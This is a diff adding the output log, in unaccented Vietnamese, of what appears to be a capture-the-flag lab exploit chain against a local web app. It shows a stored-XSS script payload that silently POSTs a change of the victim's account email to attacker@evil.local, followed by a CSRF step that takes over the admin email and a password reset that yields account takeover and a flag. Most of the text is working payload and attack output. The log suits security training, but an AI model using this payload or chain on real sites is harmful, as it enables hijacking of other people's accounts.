@@ -1,0 +1,16 @@
+[*] Mat xich 1: Stored XSS - dang binh luan chua <script>
+    payload: <script>fetch('/account/email',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({email:'attacker@evil.local'})});</script>
+    /feed tra ve script NGUYEN VEN (khong escape): True
+    trich HTML: <div class='c'><b>attacker</b>: <script>fetch('/account/email',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({email:'attacker@evil.local'})});</script></div>
+
+[*] Mat xich 2: CSRF - gia lap script XSS chay trong session nan nhan
+    email tai khoan admin TRUOC: admin@corp.local
+    POST /account/email (khong CSRF token) -> HTTP 200 {'email': 'attacker@evil.local', 'ok': True}
+
+[*] Mat xich 3: Account Takeover - reset mat khau qua email attacker
+    /account/forgot -> reset token gui toi: attacker@evil.local
+    /account/reset -> {'flag': 'FLAG{10.2_stored_xss_csrf_account_takeover}', 'message': 'password cua admin da bi doi', 'ok': True}
+
+[+] Stored XSS served raw : True
+[+] Email chiem qua CSRF  : True
+[+] Account takeover flag : FLAG{10.2_stored_xss_csrf_account_takeover}
